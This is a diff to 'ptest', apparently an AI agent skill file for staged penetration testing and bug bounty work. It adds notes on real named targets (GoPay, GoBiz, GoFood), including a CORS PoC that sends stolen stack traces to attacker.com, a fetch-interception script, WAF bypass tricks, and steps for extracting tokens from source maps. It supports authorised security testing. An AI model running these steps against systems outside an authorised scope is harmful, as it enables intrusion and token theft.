@@ -1,7 +1,7 @@
 ---
 name: ptest
 description: "Structured penetration testing framework with gated phases. Guides methodical progression from recon through exploitation to reporting."
-version: 4.1.0
+version: 4.2.0
 author: n4igme
 license: MIT
 argument-hint: "<command: start|preflight|status|resume|next|escalate|cleanup|recon-passive|recon-active|enumerate|attack-surface|vuln-assess|exploit|post-exploit|report>"
@@ -85,7 +85,7 @@ If no command is given, show current status and suggest next action.
 | `linkfinder` | 3 | `pip3 install linkfinder` | `pip3 install linkfinder` |
 | `wpscan` | 3 | `brew install wpscan` | `gem install wpscan` |
 | `nikto` | 5 | `brew install nikto` | `apt install nikto` |
-| `testssl.sh` | 5 | `brew install testssl` | `git clone https://github.com/drwetter/testssl.sh.git` |
+| `testssl.sh` | 5 | `brew install testssl` (binary: `testssl.sh`) | `git clone https://github.com/drwetter/testssl.sh.git` |
 | `sslscan` | 5 | `brew install sslscan` | `apt install sslscan` |
 | `searchsploit` | 5 | `brew install exploitdb` | `apt install exploitdb` |
 | `sqlmap` | 6 | `brew install sqlmap` | `apt install sqlmap` |
@@ -267,6 +267,7 @@ When generating phase checklists during `start`, filter techniques by scope type
 | 3 | CMS-Specific Enumeration | Y | N | N | N | Y |
 | 3 | JavaScript Analysis | Y | N | N | Y | Y |
 | 3 | JavaScript Secret Scanning (MANDATORY) | Y | N | N | Y | Y |
+| 3 | Source Map Sweep (MANDATORY when web apps found) | Y | N | N | N | Y |
 | 3 | Authentication Endpoint Mapping | Y | N | Y | Y | Y |
 | 3 | Bulk Actuator/Admin Scan (MANDATORY) | Y | N | Y | N | Y |
 | 5 | Threat Modeling | Y | Y | Y | Y | Y |
@@ -422,6 +423,8 @@ Adjust based on scope size. Large scope (50+ hosts) → more recon time. Small s
 
 **Move-on heuristic:** If a technique yields no new results after 15–20 minutes of active work, mark it `DONE` (no findings) or `FAILED (diminishing returns)` and proceed to the next technique.
 
+**Early-finding fast-track (bug bounty):** When a confirmed High/Critical finding is discovered during Phase 1-3 (before full enumeration), the operator may choose to fast-track: (1) document the finding fully, (2) complete the current phase's mandatory checks, (3) skip remaining low-priority techniques in later phases, (4) proceed directly to reporting. This is appropriate when: the finding is clearly reportable, the remaining attack surface is hardened/RBAC-blocked, and spending more time won't improve the finding's severity. Mark skipped phases as "PASSED (fast-tracked — confirmed High finding)" in state.yaml. Continue probing other live hosts briefly (10-15 min) to check for additional quick wins before closing.
+
 **Continuous engagement override:** For internal/continuous engagements (`time_budget.mode: "continuous"`), the 15-20 min heuristic is a GUIDELINE, not a hard rule. Vectors that show partial progress (e.g., JWT algorithm identified but secret not yet cracked, heapdump downloaded but not fully analyzed with MAT) deserve extended time. Use judgment: if the technique is producing incremental intelligence (even without a confirmed finding), continue. The heuristic exists to prevent spinning on dead-end vectors, not to cut short promising leads.
 
 ---
@@ -566,6 +569,22 @@ Post-engagement housekeeping:
 - Handling client pushback on findings
 - Report quality indicators
 
+**Bug bounty submissions:** See `references/bug-bounty-submission-guide.md` for:
+- Platform-specific formatting (YesWeHack, HackerOne, Bugcrowd)
+- Disclosure policy rules (NEVER publish PoCs before vendor fix)
+- Scope boundary decisions (related domains, same company)
+- Multi-finding consolidation strategy (when to combine vs separate)
+- Submission ordering (strongest first)
+- Severity justification and triage pushback responses
+
+**Attack chain narratives:** See `references/attack-chain-narrative-writing.md` for:
+- Root cause diagram template (ASCII flow)
+- Step-by-step enablement table
+- Comparison table (individual vs combined severity)
+- Systemic pattern identification
+- "Critical enabler" explanation pattern
+- Severity upgrade justification
+
 **Multi-operator coordination:** See `references/multi-operator-coordination.md` for:
 - Role definitions (Lead / Operator / Reviewer)
 - Work splitting strategies (phase-based, target-based, technique-based, hybrid)
@@ -575,6 +594,8 @@ Post-engagement housekeeping:
 - Communication protocol and sync points
 - Conflict resolution (duplicates, overlap, severity disagreements)
 - Report assembly process for multi-person teams
+
+**Bug bounty submission template:** See `templates/yeswehack-chain-submission.md` for the proven format for submitting chained/combined findings to YesWeHack (also applicable to HackerOne/Bugcrowd with minor adjustments). Key principles: combine related findings into chains for higher severity, submit strongest-scope finding first, include copy-pasteable curl commands with actual responses.
 
 The final report should follow this structure. Adapt sections based on engagement scope and findings.
 
@@ -939,6 +960,13 @@ When redoing a pentest or reassessing previously reported findings:
 
 ### CORS Origin Reflection Testing (MANDATORY Phase 5)
 
+**WordPress headless CMS pattern:** See `references/wordpress-headless-cors.md` for:
+- Detection of headless WP setups (rae/v1 namespace, X-Headless-CMS header)
+- REST API vs GraphQL CORS differences (often different policies on same host)
+- Exploitation with credentials:include (cookie-based session theft)
+- Stack trace disclosure via broken WooCommerce dependency
+- Severity assessment matrix
+
 **Full reference:** See `references/oauth-sso-attack-chains.md` (Chain 3: CORS Misconfiguration) for:
 - Complete origin test payloads and rationale (7 bypass variants)
 - Interpretation guide (ACAO + ACAC combinations → severity)
@@ -986,12 +1014,37 @@ When redoing a pentest or reassessing previously reported findings:
 
 **Key insight:** OTP endpoints are almost always unauthenticated (they're the pre-auth step). They're quick wins (5-10 minutes) that produce Medium-severity findings even without an account. Test these BEFORE declaring "unauthenticated testing exhausted."
 
+**Discovery technique (GoBiz pattern, May 2026):** When the API requires custom headers you can't guess, use browser fetch interception:
+```javascript
+// Inject in browser console BEFORE triggering the action
+const originalFetch = window.fetch;
+window._capturedRequests = [];
+window.fetch = function(...args) {
+  const [url, options] = args;
+  if (url && url.toString().includes('TARGET_KEYWORD')) {
+    window._capturedRequests.push({
+      url: url.toString(),
+      method: options?.method,
+      headers: options?.headers ? Object.fromEntries(
+        options.headers instanceof Headers ? options.headers.entries() : Object.entries(options.headers)
+      ) : null,
+      body: options?.body
+    });
+  }
+  return originalFetch.apply(this, args);
+};
+```
+Then trigger the action in the UI and read `window._capturedRequests`. This reveals required custom headers (e.g., `X-User-Type`, `x-appId`, `Authentication-Type`, `Gojek-Country-Code`) that aren't discoverable from JS source alone.
+
 **Minimum checklist:**
 - [ ] Enumerate OTP-related endpoints (send_otp, resend_otp, verify_otp, forgot_password)
 - [ ] Test rate limiting per-endpoint
 - [ ] Test rate limit bypass via purpose/type rotation
-- [ ] Test user enumeration via forgot_password (response differentiation)
-- [ ] Test OTP to arbitrary recipients (spam potential)
+- [ ] Test rate limit bypass via token rotation (request new OTP token → get fresh attempts)
+- [ ] Test user enumeration via response differentiation (email AND phone flows separately)
+- [ ] Test OTP to arbitrary recipients (spam/flooding potential)
+- [ ] Document OTP length and validity window (4-digit + 12min = weak; 6-digit + 5min = acceptable)
+- [ ] Check if rate limit is per-IP, per-account, or per-token (per-token is weakest)
 
 ### WAF/Ingress Bypass Techniques (Conditional)
 
@@ -1011,6 +1064,223 @@ When WAF blocks sensitive paths (actuator, swagger, admin), try these in order:
 | HTTP/1.0 downgrade | `--http1.0` flag | Bypass HTTP/2-only rules |
 
 **Document bypass as a finding** even if you can't get past the application auth layer behind it. WAF bypass + application auth = defense-in-depth failure.
+
+### Source Map → Token Exploitation Chain (Phase 1/3/6)
+
+**Full reference:** See `references/source-map-token-exploitation.md` for:
+- Multi-app source map sweep methodology (MANDATORY once one is found)
+- 3-step exploitation chain: source map → auth pattern → token extraction → verified write access
+- Telemetry/clickstream token exploitation (Grafana Faro, Raccoon, Segment)
+- CORS + Debug Mode = cross-origin architecture extraction (combined severity upgrade)
+- CMS API route discovery pattern (check production site HTML for correct URL format)
+- Flutter Web / Protobuf bundle analysis
+- Severity matrix and bug bounty submission strategy
+
+**Minimum checklist (add to Phase 3 technique 3.7 — JavaScript Secret Scanning):**
+- [ ] For each live web app: check `main.*.js.map`, `app.*.js.map`, `*-protos*.js.map`
+- [ ] If source map found: extract auth patterns (Authorization, Bearer, Basic, X-API-Key)
+- [ ] Extract tokens from minified JS using discovered env var names
+- [ ] Verify token write access (POST with empty body → 200 vs 401)
+- [ ] If one app has source maps: check ALL other apps on same infrastructure
+- [ ] Document: token value, decoded value, endpoint, HTTP response code
+
+**Key insight (GoPay, May 2026):** Source maps on 2 production apps revealed 3 clickstream tokens all granting write access to the same event pipeline. The source map turned a buried token in 400KB of minified JS into a 3-command exploit chain. Always check staging apps too — they often have MORE verbose config (NRAK user API keys, internal URLs, client credentials).
+
+### Laravel Debug Mode Detection & Exploitation
+
+When Laravel applications are found (detected via: Symfony exception format in JSON responses, `/vendor` 301, `/horizon` 302, cookie names like `XSRF-TOKEN` with Laravel encryption format):
+
+**Detection signals:**
+- JSON 404 responses with `"exception"`, `"file"`, `"line"`, `"trace"` keys
+- Different response sizes for routes that hit middleware vs routes that don't exist at all
+- Cookie: `XSRF-TOKEN=eyJ...` (base64 JSON with `iv`, `value`, `mac`, `tag` structure)
+
+**What debug mode reveals:**
+- Application path (e.g., `/var/www/gopay-backend/`)
+- Model names (e.g., `App\Models\Article`) → reveals database table structure
+- Middleware chain → reveals auth/locale/cache layers
+- Vendor packages → reveals dependencies for CVE mapping
+- Route binding patterns → reveals valid URL structures
+
+**Exploitation steps:**
+1. Identify routes that hit application middleware (different stack trace = route exists)
+2. Differentiate: `NotFoundHttpException` from Router (route doesn't exist) vs `ModelNotFoundException` (route exists, record doesn't)
+3. Use ModelNotFoundException messages to enumerate valid route patterns: `/api/v1/{resource}/{id}`
+4. Try numeric IDs, UUIDs, and slug patterns on confirmed routes
+5. Check if any routes return data without authentication
+
+**Severity:** Medium-High for production financial apps. Debug mode exposes internal architecture that aids further attacks. Combined with other findings (exposed admin panels, staging environments), it demonstrates systemic configuration management failure.
+
+**Common co-findings on Laravel apps:**
+- `/horizon` → Laravel Horizon queue dashboard (often behind auth but confirms Laravel)
+- `/.env` → 403 means file exists (try nginx bypass: `/.env%00`, `/..;/.env`, path traversal)
+- `/telescope` → Laravel Telescope debug dashboard
+- `/api/v1/{resource}/{locale}` → AcceptLocale middleware pattern (locale as URL segment)
+- `/api/{locale}/{resource}` → Alternative locale-as-path pattern (GoPay CMS uses this)
+
+**Debug Mode + CORS Wildcard Chain (GoPay, May 2026):**
+
+When `APP_DEBUG=true` is combined with `Access-Control-Allow-Origin: *`, any website can extract internal architecture cross-origin. This is NOT just info disclosure — it's exploitable:
+
+1. Debug mode exposes stack traces with file paths, models, middleware, dependencies
+2. CORS `*` allows any origin to read these responses via JavaScript
+3. Spatie QueryBuilder errors reveal ALL database columns: `?sort=INVALID` → "Allowed sort(s) are `id, title, ...`"
+4. ModelNotFoundException reveals table/model names: `/api/id/articles/99999` → "No query results for model [App\Models\Article]"
+
+**Exploitation PoC pattern:**
+```javascript
+// Any malicious website can extract this cross-origin
+fetch('https://cms-target.com/api/v1/nonexistent', {
+    headers: {'Accept': 'application/json'}
+})
+.then(r => r.json())
+.then(data => {
+    // data.file = "/var/www/backend/..."
+    // data.trace = [{file: "...", line: N}, ...]
+    // Full architecture extracted without auth
+    navigator.sendBeacon('https://attacker.com/collect', JSON.stringify(data));
+});
+```
+
+**Finding the correct API path (when /api/v1/ returns 404):**
+Check the production site's HTML source for API calls. The frontend often fetches from the CMS with the correct path pattern:
+```bash
+curl -sk "https://target.com/blog" | grep -oiE 'https?://[^"]*api[^"]*' | sort -u
+# May reveal: http://cms-target.com/api/id/articles (locale as path segment!)
+```
+
+**Database schema enumeration via error messages:**
+```bash
+# Enumerate allowed sort columns (= database columns)
+curl -sk "https://cms-target.com/api/{locale}/articles?sort=INVALID" -H "Accept: application/json"
+# → "Allowed sort(s) are `id, title, slug, author, is_private, published_at, ...`"
+
+# Enumerate allowed filters
+curl -sk "https://cms-target.com/api/{locale}/articles?filter[INVALID]=x" -H "Accept: application/json"
+
+# Enumerate allowed includes (relationships)
+curl -sk "https://cms-target.com/api/{locale}/articles?include=INVALID" -H "Accept: application/json"
+```
+
+**CMS API Path Discovery (SuitCMS/Laravel pattern, GoPay May 2026):**
+
+When debug traces reveal `AcceptLocale` middleware blocking `/api/v1/{resource}`, the actual API path is often `/api/{locale}/{resource}` (locale as path segment, NOT header). Discovery technique:
+
+1. Check the production site's HTML source for API calls:
+   ```bash
+   curl -sk "https://target.com/blog" | grep -oiE 'https?://[^"]*api[^"]*' | sort -u
+   ```
+2. This reveals the correct URL pattern (e.g., `/api/id/articles` not `/api/v1/articles`)
+3. Differentiate real routes from non-existent ones by response SIZE:
+   - Size A (e.g., 11739) = route EXISTS but middleware rejects → try correct path format
+   - Size B (e.g., 9042) = route does NOT exist at all
+4. Once correct path found, enumerate all endpoints:
+   ```bash
+   for ep in articles categories menus faqs promos banners tags products teams careers; do
+     curl -sk -o /dev/null -w "%{http_code}:%{size_download} $ep\n" \
+       "https://cms.target.com/api/id/$ep" -H "Accept: application/json"
+   done
+   ```
+5. Check `OPTIONS` to confirm read-only (`Allow: GET,HEAD`) vs read-write access
+
+### GoTo/Gojek/GoBiz GoID Authentication Testing
+
+**Full reference:** See `references/gojek-gobiz-auth-patterns.md` for:
+- GoID endpoint structure (/goid/login/request, /goid/token)
+- Required custom headers (X-User-Type, x-appId, Gojek-Country-Code, etc.)
+- Login request payloads (email password, email OTP, phone OTP)
+- Token exchange payloads (password, OTP, refresh)
+- User enumeration response patterns (OTP flow differentiates, password flow doesn't)
+- Rate limiting behavior (per-email, per-token, not per-IP)
+- Environment config exposure via inline $_ENV in HTML
+
+### Next.js Server-Side Proxy Pattern (SSR API Routes)
+
+Modern web apps (Next.js, Nuxt, SvelteKit) often proxy API calls through their own server-side routes. The frontend calls `/goid/token` on the SAME origin, and the Next.js server adds session tokens, CSRF validation, captcha verification, and internal headers before forwarding to the real backend.
+
+**Detection signals:**
+- API endpoints on the same domain as the frontend (not a separate api.* subdomain)
+- `x-nextjs-cache` header in responses
+- JS bundle references paths like `/goid/token` with `credentials: "include"` (cookie-based)
+- Server returns "missing field" errors even when you provide all visible fields (server adds hidden ones)
+- CSRF cookies (csrfSecret + XSRF-TOKEN) required for API calls
+
+**Implications for testing:**
+1. You CANNOT replicate the full request externally — the server adds fields from its session store
+2. The captcha token is consumed server-side and converted to a session flag — you can't skip it
+3. Browser-based testing is the ONLY way to trigger these flows (fetch interception)
+4. Non-prod environments may have the same proxy but with relaxed WAF — test there first
+5. The `/goid/token` endpoint may pass through without full proxy validation (refresh tokens don't need captcha)
+
+**Testing strategy:**
+- Use browser fetch interception to capture the FULL request (headers + body + cookies)
+- If captcha blocks browser automation, document as blocker and assess close-out
+- Focus on endpoints that bypass the proxy (direct backend access via gojekapi.com)
+- Test grant_type variations on /goid/token (refresh_token, client_credentials) — these may not require captcha
+
+**GoFood-specific patterns (May 2026):**
+- Consumer web uses `x-user-type: customer` (vs `merchant` for GoBiz)
+- Client ID: `gofood-web` (proxy-only, not registered on direct GoID API)
+- Additional endpoints: `/v6/customers/newrequest`, `/v6/customers/phone/verify`, `/v6/customers/register`
+- Field name difference: `phone` (with +62 prefix) vs GoBiz's `phone_number` + `country_code`
+- `/v2/otp/retry` accepts `otp_token` field — validates token expiry without captcha
+- 49 reCAPTCHA elements detected in login modal — heavy captcha protection
+- Headers from JS: `x-user-type`, `x-user-locale`, `gojek-country-code`, `gojek-timezone`, `x-location`, `x-uniqueId`, `x-platform`, `x-appversion`, `gojek-service-area`, `gojek-service-type`, `x-captcha-token`, `x-captcha-appid`
+
+### Tencent Cloud WAF (T-Sec-WAF) Behavior Patterns
+
+When testing targets behind Tencent Cloud WAF:
+
+| Behavior | Indicator |
+|----------|-----------|
+| WAF block | 403 + `T-Sec-WAF: StdPortNoMatchServer` header (no Host match) |
+| WAF block (rule) | 403 + HTML page with "Your request has been interrupted" + UUID |
+| Kong behind WAF | 404 + `{"message":"no Route matched with those values"}` + `X-Kong-*` headers |
+| Kong auth | 401 + `WWW-Authenticate: Bearer realm=gojek` |
+
+**WAF rules observed (GoBiz, May 2026):**
+- Blocks dotfile access (`.git`, `.env`, `.gitignore`) — returns 403
+- Blocks `/api/*` prefix with common attack paths — returns 403
+- Blocks path traversal with `..;` and `%2f` — returns 403
+- Blocks SQLi patterns in URL path — returns 403
+- Does NOT block: standard `../` (Kong normalizes), double-encoding `%252f` (Kong routes)
+
+**WAF rules observed (GoFood, May 2026):**
+- Blocks `/actuator/env`, `/.env`, `/.git/HEAD` — returns 403 (2810 bytes WAF block page)
+- Blocks `/goid/login/request` on prod — returns 403
+- Does NOT block `/goid/token` on prod — returns real API errors (400/401)
+- Non-prod environments (alpha, q, integration) have RELAXED WAF — GoID endpoints accessible
+- WAF block page: `server: stgw`, `eo-log-uuid` header, references `api.waf-intl.qq.com`
+
+**Tencent EdgeOne status codes:**
+- 418: "No Host match" — vhost not configured for that IP (TencentEdgeOne server header)
+- 403 + WAF block page: Rule-based block (stgw server header, eo-log-uuid header)
+
+**WAF bypass attempts that FAILED:**
+HTTP/1.0 downgrade, case variation (.Git/.GIT), URL encoding (%2e%67%69%74), zero-width space, backslash, overlong UTF-8, X-Original-URL header, null byte, trailing space/newline
+
+**WAF bypass that reached Express.js (but file not found):**
+Tab in path (`%09`), semicolon path param (`;x=1`), fragment encode (`%23`) — these bypass the WAF dotfile rule but Express.js doesn't normalize them to the actual file path.
+
+**Key insight:** Tencent WAF checks the raw URL before decoding. If you can find a character that WAF ignores but the backend normalizes, you bypass. For Express.js specifically, no working bypass was found (Express serves files by exact decoded path).
+
+### Exposed Kubernetes Management Tooling (ArgoCD, Grafana, Prometheus)
+
+**Full reference:** See `references/kubernetes-management-tooling.md` for:
+- Detection signals (subdomain patterns, response indicators)
+- ArgoCD assessment (unauthenticated endpoints, settings analysis, CVE mapping)
+- Grafana/Prometheus/Harbor/Vault assessment procedures
+- Device code flow exploitation (cross-ref: `references/oauth-sso-attack-chains.md`)
+- Severity guidance and reporting framing
+
+**Key insight:** When Istio RBAC blocks all API services, look for management tooling that sits OUTSIDE the mesh or has different auth (ArgoCD with Dex, Grafana with local auth, Prometheus with no auth). These are often the only exploitable entry points on heavily-hardened cloud-native targets.
+
+**Minimum checklist (add to Phase 2/3 when cloud-native infra detected):**
+- [ ] Check for ArgoCD subdomains (argocd*, argo-cd*, gitops*)
+- [ ] Check for Grafana/Prometheus/Jaeger subdomains
+- [ ] If found: test unauthenticated endpoints (/api/version, /api/v1/settings, /healthz)
+- [ ] If Dex/OIDC present: test device code flow
+- [ ] Document version + exposed configuration even if auth blocks further access
 
 ### Exploiting Exposed Keycloak via Gateway
 
@@ -1116,14 +1386,24 @@ If auth is app-level (not mesh-level), document that:
 
 ## Guardrails
 
+- **Public Disclosure Prohibition** — NEVER publish PoCs, exploit code, or vulnerability details on public URLs (GitHub Pages, personal blogs, Codepen, JSFiddle, public repos) before the vendor acknowledges AND fixes the vulnerability (or 90-day disclosure deadline passes). PoC code belongs in the report body or as a private attachment on the platform. If a hosted PoC is needed for demonstration (e.g., CORS chain), embed the HTML directly in the submission. If you accidentally publish, immediately remove it (git force-push to remove from history), check caches (Google, Wayback Machine), and disclose the brief exposure in your report. Violation = no bounty + potential platform ban. **Real incident (GoPay, May 2026):** PoC pushed to GitHub Pages had to be reverted via `git reset --hard` + force-push. The page was live briefly but returned 404 by the time we checked. Always keep PoCs local in `ptest-output/report/`. See `references/bug-bounty-submission-guide.md` for full policy.
+- **Bug Bounty Scope Interpretation** — Pay close attention to scope TYPE on bug bounty platforms. A target listed as "Web application" (e.g., `mokapos.com`) means ONLY that specific domain/app, NOT `*.mokapos.com` wildcard. Only targets explicitly listed as "Wildcard" (e.g., `*.gopayapi.com`) include subdomains. When in doubt, ask the operator before spending time on subdomain recon. Per most programs: "valid report submissions that are outside of the in-scope assets... won't probably go higher than a Tier 2 Medium bounty." Confirm scope interpretation BEFORE Phase 1 subdomain enumeration to avoid wasted effort.
 - **Account Creation Blockers (Bug Bounty)** — some targets require identity verification (KYC, PAN card, national ID) or region-specific phone numbers for account creation. Browser automation is often blocked by Cloudflare/reCAPTCHA. When unauthenticated testing is exhausted and account creation is blocked: (1) document the limitation clearly, (2) offer the user options (manual signup, Google OAuth, API-based registration if available), (3) if user creates account manually, request the auth token from DevTools (Authorization header or cookie). Never attempt to bypass KYC or create fraudulent accounts.
-- **Hardened Target Fast-Exit** — if the first 3 vectors on a target all fail cleanly (proper error handling, no info leak, auth enforced, no default creds), mark it as "hardened" in the checklist and move on. Maximum 15-20 minutes per hardened target. Document what was tested and why it's considered hardened.
+- **Hardened Target Fast-Exit** — if the first 3 vectors on a target all fail cleanly (proper error handling, no info leak, auth enforced, no default creds), mark it as "hardened" in the checklist and move on. Maximum 15-20 minutes per hardened target. Document what was tested and why it's considered hardened. **Exception:** Always check pre-auth flows (OTP, login, registration, password reset) even on hardened targets — these are outside the auth boundary and often have different security controls than the main API.
+- **Zero-Finding Close-Out Path** — if Phase 5 concludes with 0 confirmed exploitable vectors AND all priority targets from the attack surface matrix are either (a) hardened with proper auth, (b) blocked by WAF with no bypass found, or (c) excluded by program rules, then fast-track Phases 6-8: mark Phase 6 as "PASSED (no exploitable vectors)", Phase 7 as "PASSED (N/A — no access achieved)", and proceed directly to a close-out report documenting the security posture assessment. Do NOT spend time "exploiting" vectors that don't exist. The close-out report should document: what was tested, why it's hardened, what would be needed for deeper testing (e.g., authenticated access, mobile app account).
+- **Program Exclusion Cross-Check (Phase 4, MANDATORY)** — during attack surface mapping, cross-reference ALL discovered vectors against the bug bounty program's exclusion list BEFORE scoring them. Vectors that match program exclusions (e.g., rate limiting, user enumeration, staging environments, public API keys) should be marked as "EXCLUDED (program rule)" in the priority matrix with score 0. This prevents wasting Phase 5-6 time on vectors that can't be reported. Document exclusions in the attack surface checklist. If ALL high-priority vectors are excluded, this is an early signal that the engagement may close with 0 findings.
+- **Captcha-Gated Target Assessment (Phase 5)** — when reCAPTCHA/hCaptcha/Turnstile protects all pre-auth flows, assess within 10 minutes: (1) Is captcha server-validated or client-only? (check if removing the token from the request changes the error), (2) Are there endpoints that bypass captcha? (OTP retry, token refresh, registration steps after initial captcha), (3) Is captcha enforced on non-prod environments? If server-validated on all environments with no bypass path, document as "authentication blocker" and factor into close-out decision. Do NOT spend 20+ minutes trying header combinations when the server-side proxy is adding a captcha-derived session token you can't replicate.
+- **RBAC Mesh Fast-Exit** — when a target domain has 50+ subdomains ALL returning identical 403 responses with the same body/headers (e.g., Istio RBAC `RBAC: access denied`), this indicates mesh-level authorization policy blocking ALL external traffic. After confirming the pattern on 10-15 representative hosts (mix of service names), mark the entire domain as "mesh-blocked" and move on. Do NOT enumerate all 500 subdomains individually. Document: (1) sample of hosts tested, (2) consistent 403 response body, (3) mesh technology identified (Istio/Envoy/Linkerd), (4) conclusion that external testing is exhausted without valid mesh credentials. Time cap: 30 minutes total for the domain. The only vectors worth trying on mesh-blocked targets are: WAF/ingress bypass techniques (path normalization, header injection), looking for non-mesh endpoints (health checks, metrics ports), and checking if any subdomain resolves to a DIFFERENT IP (not behind the mesh).
+
+- **SPA Catch-All Detection** — before reporting actuator/admin/swagger findings on React/Next.js/Vue apps, verify the response size differs from a random nonexistent path. SPAs serve the same index.html for ALL routes (200 status). Compare `curl -sk -o /dev/null -w "%{size_download}" "$URL/actuator"` vs `curl -sk -o /dev/null -w "%{size_download}" "$URL/nonexistent12345xyz"`. If sizes match → false positive (SPA catch-all). Also check 301/302 responses — Kong/CDN catch-all redirects produce the same pattern.
 - **Environment Tagging** — every finding MUST be tagged with the environment: `prod`, `nonprod`, `experiment`, or `all`. Findings on nonprod/experiment instances should note "may not apply to production" unless the same configuration is confirmed on prod. This prevents over-reporting experiment-only issues as production risks.
-- **False Positive Verification** — before logging a finding, verify it's not a false positive. Check for SPA catch-alls (same bytes for any path), CORS crashes masking endpoints (all 500s with same error), and 302-to-login (auth required, not bypassed). See `references/false-positive-detection.md`.
+- **False Positive Verification** — before logging a finding, verify it's not a false positive. Check for SPA catch-alls (same bytes for any path), CORS crashes masking endpoints (all 500s with same error), and 302-to-login (auth required, not bypassed). See `references/false-positive-detection.md`. **Bulk actuator scan pitfall:** When scanning hosts behind Kong/Nginx that serve React SPAs, ALL paths return 200 with identical body size. Also watch for Kong catch-all redirects (301 to login page) and CDN redirects (302 to parent domain). Always baseline with a random nonexistent path FIRST, then filter results by size/redirect-target before investigating.
 - **Strict Sequence** — never skip a phase. No exploitation before enumeration and vuln assessment are complete. Even for bug bounties where "fast-tracking to exploitation" seems tempting, the framework exists to prevent blind spots. Never suggest skipping phases to the operator.
 - **Self-Audit Before Advancing** — before requesting gateway sign-off, proactively review what was missed in the current phase. List gaps honestly (e.g., "we didn't decompile the APK", "we didn't scrape the API docs"). Offer to fill gaps before moving forward. The operator expects thoroughness over speed. Never suggest skipping phases even for bug bounties or "efficiency" — the framework exists to prevent blind spots. Each phase builds on the previous one; shortcuts create gaps that cost more time later.
-- **Phase 1 OSINT Completeness** — before declaring Phase 1 complete, verify ALL of these were attempted: (1) WHOIS/DNS/TXT, (2) subdomain enum (multi-source), (3) Wayback Machine, (4) GitHub/GitLab code search, (5) Google dorking, (6) Shodan/Censys on discovered IPs, (7) JS bundle analysis from accessible apps, (8) Mobile app identification (package names, APK endpoints), (9) Docker Hub/container registry check, (10) breach/paste site check (if tools available). Missing any of these is a gap that should be filled before advancing. Never SUGGEST skipping phases either — even for bug bounties where "time to bounty" feels urgent. The user has explicitly stated: "never skip the phase. because it's a fundamental thing." Each phase builds on the previous; shortcuts produce blind spots.
+- **Phase 1 OSINT Completeness** — before declaring Phase 1 complete, verify ALL of these were attempted: (1) WHOIS/DNS/TXT, (2) subdomain enum (multi-source), (3) Wayback Machine, (4) GitHub/GitLab code search, (5) Google dorking, (6) Shodan/Censys on discovered IPs, (7) JS bundle analysis from accessible apps, (8) Mobile app identification (package names, APK endpoints), (9) Docker Hub/container registry check, (10) dark web & breach data OSINT (see `references/dark-web-breach-osint.md` for full methodology: HIBP, DeHashed, IntelX, Ahmia, ransomware leak sites, DeepDarkCTI). Missing any of these is a gap that should be filled before advancing. Never SUGGEST skipping phases either — even for bug bounties where "time to bounty" feels urgent. The user has explicitly stated: "never skip the phase. because it's a fundamental thing." Each phase builds on the previous; shortcuts produce blind spots.
 - **Scope Enforcement** — never test targets outside defined scope. Re-read `scope.md` before each technique.
+- **Bug Bounty Related-Domain Scope Risk** — when you discover findings on domains that are clearly the same company/product but use a DIFFERENT root domain than what's listed in scope (e.g., `go-pay.co.id` vs scoped `gopay.co.id`), treat these as borderline. Strategy: (1) submit clear-scope findings first to establish credibility, (2) submit borderline-scope findings LAST with a "Scope note" explaining why the asset relates to in-scope targets, (3) frame impact in terms of how it affects the explicitly-scoped assets (e.g., "ArgoCD manages the K8s cluster serving *.gopayapi.com"). Worst case: reduced bounty tier. Best case: accepted at full severity because the triager recognizes it's the same infrastructure.
+- **Bug Bounty Scope Type Interpretation** — when a program lists an asset as "Web application" (e.g., `mokapos.com`) vs "Wildcard" (e.g., `*.gopayapi.com`), treat them differently. A "Web application" scope means ONLY that specific domain (and www), NOT all subdomains. Subdomains may be accepted at program discretion but at reduced bounty. Always check the scope type column before starting subdomain enumeration. If the operator wants to test broadly anyway, document the risk of rejection in scope.md.
 - **Evidence Required** — every finding must have reproducible proof.
 - **Verified Findings Only** — a finding must be backed by direct evidence of exploitability or exposure. DNS resolution or CT log presence alone does NOT constitute a finding. Every finding must include proof that the issue is currently exploitable or observable (e.g., HTTP response showing an unauthenticated panel, not just a DNS record pointing to it). Unverified potential issues belong in a "Potential Issues" list for the next phase to validate — not in the findings log.
 - **Mandatory Tool Execution** — mandatory tools listed per phase must be run. If unavailable, document the gap explicitly. Never substitute manual probing for an available automated scanner.
